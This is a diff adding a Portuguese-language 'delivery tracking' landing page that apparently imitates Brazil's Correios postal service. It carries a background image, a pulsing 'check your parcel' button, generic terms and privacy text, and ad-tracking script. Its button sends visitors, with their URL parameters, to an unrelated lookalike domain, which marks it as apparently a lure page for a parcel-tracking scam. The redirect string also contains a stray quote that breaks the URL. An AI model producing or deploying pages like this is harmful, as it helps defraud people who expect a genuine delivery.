@@ -1,0 +1,243 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Rastreamento de Entrega</title>
+
+  <!-- UTMify para rastreamento -->
+  <script
+    src="https://cdn.utmify.com.br/scripts/utms/latest.js"
+    data-utmify-prevent-xcod-sck
+    data-utmify-prevent-subids
+    async
+    defer
+  ></script>
+
+  <style>
+    html, body {
+      margin: 0;
+      padding: 0;
+      height: 100%;
+      background: linear-gradient(to bottom, #fffbe6, #ffffff);
+      font-family: 'Segoe UI', sans-serif;
+      display: flex;
+      flex-direction: column;
+    }
+
+    .header {
+      width: 100%;
+      background-color: #1976d2;
+      color: white;
+      padding: 12px;
+      text-align: center;
+      font-size: 15px;
+      font-weight: 500;
+      white-space: nowrap;
+    }
+
+    .conteudo {
+      flex: 1;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      padding-top: 5vh;
+      position: relative;
+      z-index: 1;
+    }
+
+    .caixa {
+      background-color: #fff176;
+      padding: 40px 30px;
+      border-radius: 12px;
+      box-shadow: 0 8px 25px rgba(0, 0, 0, 0.15);
+      text-align: center;
+      max-width: 360px;
+      width: 100%;
+      animation: fadeIn 0.7s ease-in-out;
+    }
+
+    .caixa p {
+      font-size: 18px;
+      color: #333;
+      margin-bottom: 16px;
+    }
+
+    .caixa .destaque {
+      font-size: 22px;
+      font-weight: bold;
+      color: #222;
+      margin-bottom: 20px;
+    }
+
+    .botao {
+      background-color: #4caf50;
+      color: white;
+      border: none;
+      padding: 14px 30px;
+      font-size: 17px;
+      border-radius: 10px;
+      cursor: pointer;
+      animation: pulse 2s infinite;
+      transition: transform 0.2s, background-color 0.3s;
+      margin-top: 10px;
+    }
+
+    .botao:hover {
+      animation: none;
+      background-color: #43a047;
+      transform: scale(1.05);
+    }
+
+    .links-legais {
+      margin-top: 25px;
+      font-size: 14px;
+      color: #555;
+    }
+
+    .links-legais a {
+      color: #2e7d32;
+      text-decoration: underline;
+      cursor: pointer;
+      margin: 0 8px;
+    }
+
+    .modal {
+      display: none;
+      position: fixed;
+      z-index: 99;
+      left: 0;
+      top: 0;
+      width: 100%;
+      height: 100%;
+      overflow: auto;
+      background-color: rgba(0,0,0,0.6);
+    }
+
+    .modal-content {
+      background-color: #fff;
+      margin: 10% auto;
+      padding: 20px;
+      border-radius: 10px;
+      width: 90%;
+      max-width: 500px;
+      box-shadow: 0 4px 20px rgba(0,0,0,0.2);
+    }
+
+    .close {
+      color: #aaa;
+      float: right;
+      font-size: 24px;
+      font-weight: bold;
+      cursor: pointer;
+    }
+
+    .close:hover {
+      color: black;
+    }
+
+    .fundo-imagem {
+      position: fixed;
+      bottom: 0;
+      left: 0;
+      width: 100%;
+      max-height: 220px;
+      object-fit: cover;
+      opacity: 0.9;
+      z-index: 0;
+      pointer-events: none;
+    }
+
+    @media (min-width: 769px) {
+      .fundo-imagem {
+        display: none;
+      }
+    }
+
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(20px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+
+    @keyframes pulse {
+      0% { transform: scale(1); }
+      50% { transform: scale(1.05); }
+      100% { transform: scale(1); }
+    }
+  </style>
+</head>
+<body>
+
+  <div class="header">
+    Clique no botão para rastrear sua entrega
+  </div>
+
+  <div class="conteudo">
+    <div class="caixa">
+      <p class="destaque">🚚 Deseja rastrear sua entrega?</p>
+      <p>📦 Verifique se sua encomenda já foi atualizada no sistema.</p>
+      <p>📍 Acompanhe o trajeto até sua casa com praticidade e segurança.</p>
+      <p>🧾 Consulte o status com apenas um clique abaixo:</p>
+      
+      <button class="botao">Clique aqui para consultar</button>
+
+      <div class="links-legais">
+        <a onclick="abrirModal('modalTermos')">Termos de Serviço</a> |
+        <a onclick="abrirModal('modalPrivacidade')">Política de Privacidade</a>
+      </div>
+    </div>
+  </div>
+
+  <!-- Imagem exibida apenas em celular -->
+  <img src="correios-fundo.png" class="fundo-imagem" alt="imagem de fundo" />
+
+  <!-- Modal Termos -->
+  <div id="modalTermos" class="modal">
+    <div class="modal-content">
+      <span class="close" onclick="fecharModal('modalTermos')">&times;</span>
+      <h2>Termos de Serviço</h2>
+      <p>Ao acessar este site, você concorda com nossos termos de uso. Os dados fornecidos serão utilizados apenas para fins de consulta de entrega. É proibido copiar, reproduzir ou redistribuir o conteúdo sem autorização.</p>
+    </div>
+  </div>
+
+  <!-- Modal Política -->
+  <div id="modalPrivacidade" class="modal">
+    <div class="modal-content">
+      <span class="close" onclick="fecharModal('modalPrivacidade')">&times;</span>
+      <h2>Política de Privacidade</h2>
+      <p>Levamos sua privacidade a sério. Seus dados são armazenados de forma segura e utilizados exclusivamente para oferecer o serviço de rastreamento solicitado. Não compartilhamos informações com terceiros.</p>
+    </div>
+  </div>
+
+  <script>
+    document.addEventListener("DOMContentLoaded", function () {
+      // Redireciona com parâmetros da URL
+      document.querySelector(".botao").addEventListener("click", function () {
+        const params = window.location.search;
+        const destino = "'https://www.rasteriobr-servico.site/consultar.htm";
+        window.location.href = destino + params;
+      });
+
+      // Abrir modal
+      window.abrirModal = function(id) {
+        const modal = document.getElementById(id);
+        if (modal) modal.style.display = "block";
+      };
+
+      // Fechar modal
+      window.fecharModal = function(id) {
+        const modal = document.getElementById(id);
+        if (modal) modal.style.display = "none";
+      };
+
+      // Fechar ao clicar fora
+      window.addEventListener("click", function (event) {
+        if (event.target.classList.contains("modal")) {
+          event.target.style.display = "none";
+        }
+      });
+    });
+  </script>
+
+</body>
+</html>
